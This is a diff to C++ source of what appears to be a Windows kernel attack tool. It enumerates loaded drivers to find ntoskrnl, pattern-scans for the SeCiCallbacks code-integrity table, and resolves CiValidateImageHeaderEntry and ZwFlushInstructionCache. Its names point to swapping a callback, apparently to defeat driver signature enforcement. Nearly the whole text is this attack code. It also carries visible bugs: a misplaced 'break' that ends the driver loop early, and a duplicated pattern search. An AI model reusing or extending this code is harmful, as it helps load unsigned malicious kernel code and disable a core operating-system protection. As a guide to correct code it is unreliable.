@@ -10,9 +10,9 @@ bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
     // Query loaded kernel drivers
     std::printf( "[*] Enumerating Loaded Drivers...\n" );
 
-    std::this_thread::sleep_for( std::chrono::milliseconds( 300 ) );
-
     if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &cbNeeded ) || cbNeeded > sizeof( drivers ) ) return false;
+
+    std::this_thread::sleep_for( std::chrono::milliseconds( 300 ) );
 
     int cDrivers = cbNeeded / sizeof( LPVOID );
 
@@ -21,18 +21,14 @@ bool modules::EnumerateKernelModules( const std::wstring& targetModuleName )
 
         if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {
 
-            std::wstring driverName( szDriverName );
-
-            if ( _wcsicmp( driverName.c_str(), targetModuleName.c_str() ) == 0 ) {
+            if ( helpers::match_ascii_icase( szDriverName, targetModuleName.c_str() ) ) {
                 globals::nt_base = drivers[i];
                 return true;
             }
-        }
-        else
+        } else
             std::wcerr << L"[!] Failed to get driver base name for driver at: " << drivers[i] << std::endl; break;
-    }
-    // Failed, just return 0
-    return 0;
+    }    
+    return false; // Failed, just return false
 }
 
 
@@ -58,20 +54,26 @@ seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
     uintptr_t ep = helpers::GetEntryPoint( usermode_load_va );
     std::printf( "[*] ntoskrnl.exe Entry Point: 0x%p\n", ep );
 
+    // Pattern:  LEA RAX, [RIP+offset] ; MOV [RBX+20], RAX
     unsigned char pattern[] = {
-        0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00 
+        0x48, 0x8D, 0x05, 0x00, 0x00, 0x00, 0x00, // lea rax, [rip+????]
+        0x48, 0x89, 0x43, 0x20                   // mov [rbx+20], rax
     };
-    const char* mask = "xxx????";
 
-    auto test = ( ULONG_PTR )ntoskrnl_ptr - mod_base;
-
-    std::printf( "[*] ntoskrnl.exe Entry Point: 0x%p\n", test );
-
+    const char* mask = "xxx????xxxx";
+    DWORD64 seCiCallbacksInstr1 = helpers::find_pattern( uNtAddr, modinfo.SizeOfImage, pattern, mask, 0 );
     DWORD64 seCiCallbacksInstr = helpers::find_pattern( uNtAddr, modinfo.SizeOfImage, pattern, mask, 0 );
 
-    wprintf( L"[*] Usermode CiCallbacks: 0x%016llX\n", seCiCallbacksInstr );
+    INT32 seCiCallbacksLeaOffset = *( INT32* )( seCiCallbacksInstr1 + 3 );
 
-    DWORD64 KernelOffset = seCiCallbacksInstr - uNtAddr;
+    DWORD64 nextInstructionAddr = seCiCallbacksInstr1 + 3 + 4;
+
+    DWORD64 seCiCallbacksAddr = nextInstructionAddr + seCiCallbacksLeaOffset;
+
+    wprintf( L"[*] seCiCallbacksInstr CiCallbacks: 0x%016llX\n", seCiCallbacksInstr1 );
+    wprintf( L"[*] seCiCallbacksInstr CiCallbacks before operation: 0x%016llX\n", seCiCallbacksInstr );
+
+    DWORD64 KernelOffset = seCiCallbacksInstr1 - uNtAddr;
     wprintf( L"[*] Offset: 0x%016llX\n", KernelOffset );
 
     DWORD64 kernelAddress = mod_base + KernelOffset;
@@ -83,8 +85,6 @@ seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
     std::printf( "[*] ciValidateImageHeaderEntry: 0x%p\n", ciValidateImageHeaderEntry );
 
     std::printf( "[*] zwFlushInstructionCache: 0x%p\n", zwFlushInstructionCache );
-
-    std::printf( "[*] ciValidateImageHeaderEntry: 0x%p\n", kernelAddress );
 
     system( "pause" );
     return seCiCallbacks_swap{ 0 };
